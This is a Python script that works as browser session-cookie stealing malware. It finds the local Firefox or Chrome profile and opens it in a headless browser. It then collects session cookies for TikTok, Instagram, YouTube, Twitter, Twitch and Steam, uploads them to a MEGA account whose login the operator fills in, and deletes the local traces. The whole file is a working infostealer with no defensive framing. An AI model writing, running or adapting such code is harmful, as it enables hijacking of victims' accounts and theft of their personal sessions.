import sys
import time
import selenium
from selenium import webdriver
import os
from mega import Mega
import pickle
import re

def UploadToMega(social_name,session):
    mega = Mega()
    m = mega.login(email, password)
    pickle.dump(session, open(social_name, "wb"))
    m.upload(social_name)
    os.remove(social_name)
    if os.name == 'posix':
        try: os.remove("geckodriver.log")
        except: None

def GetCookies(driver,webs):
    for web in webs:
        driver.get(web)
        session_cookie = driver.get_cookies()

        #Getting Name Format For Upload
        web_good_format = str((re.findall(r'\/\/(.+?)\/', str(web))))
        web_good_format = web_good_format.replace(".","")
        web_good_format = web_good_format.replace("[", "")
        web_good_format = web_good_format.replace("]", "")
        web_good_format = web_good_format.replace("'", "")
        web_good_format = web_good_format.replace("www", "")
        web_good_format = web_good_format.replace("com", "")
        web_good_format = web_good_format + ".pkl"
        UploadToMega(web_good_format, session_cookie)
    driver.close()

def Get_firefox_profile():
    try:
        #Windows
        if os.name == 'nt':
            appdata_path = os.getenv('APPDATA')
            path = "{}/Mozilla/Firefox/Profiles/".format(appdata_path)

            if os.path.exists(path):

                files = os.listdir(path)

                firefox_profile_folder = [file for file in files if
                                            os.path.isdir(os.path.join(path, file)) and 'default' in file]

                biggest_folder = 0
                biggest_folder_name = ""

                for folder in firefox_profile_folder:
                    folder_number_of_files = len(os.listdir(path + folder))
                    if biggest_folder < folder_number_of_files:
                        biggest_folder_name = folder
                        biggest_folder = folder_number_of_files

                return path + biggest_folder_name

            return None

    #Linux
        elif os.name == 'posix':
            home_dir = os.path.expanduser("~")
            path = "{}/.mozilla/firefox/".format(home_dir)

            if os.path.exists(path):

                files = os.listdir(path)

                firefox_profile_folder = [file for file in files if
                                            os.path.isdir(os.path.join(path, file)) and 'default' in file]

                biggest_folder = 0
                biggest_folder_name = ""

                for folder in firefox_profile_folder:
                    folder_number_of_files = len(os.listdir(path + folder))
                    if biggest_folder < folder_number_of_files:
                        biggest_folder_name = folder
                        biggest_folder = folder_number_of_files

                return path + biggest_folder_name

            else:
                return None

    except Exception as error:
        print(error)
        sys.exit()

def GetChromeProfile():
    try:
        if os.name == 'nt':
            appdata_path = os.getenv('localappdata')
            path = "{}/Google/Chrome/User Data".format(appdata_path)

            if os.path.exists(path):

                return path
            else:
                sys.exit()

        # Linux
        elif os.name == 'posix':
            sys.exit()
    except:
        sys.exit()

if __name__ == '__main__':

    #####################################
    #### #### ####  MEGA #### #### ####
    #####################################
    global email
    email = ""
    global password
    password = ""
    #####################################
    #####################################

    cookies_to_get = ["https://www.tiktok.com/","https://www.instagram.com/","https://www.youtube.com/","https://twitter.com/home","https://www.twitch.tv/","https://store.steampowered.com/"]

    os.environ['MOZ_HEADLESS'] = '1'

    firefox_profile = Get_firefox_profile()
    if len(firefox_profile) != 0:
        profile = webdriver.FirefoxProfile(firefox_profile)
        driver = webdriver.Firefox(profile)

    else:
        google_profile_path = GetChromeProfile()
        if len(google_profile_path) != 0:
            options = webdriver.ChromeOptions()
            options.add_argument(
                r"--user-data-dir={}".format(google_profile_path))
            options.add_argument(r'--profile-directory=Default')

            file_path = os.path.join(os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "Application"), "chrome.exe")

            driver = webdriver.Chrome(executable_path=file_path, chrome_options=options)

    GetCookies(driver,cookies_to_get)






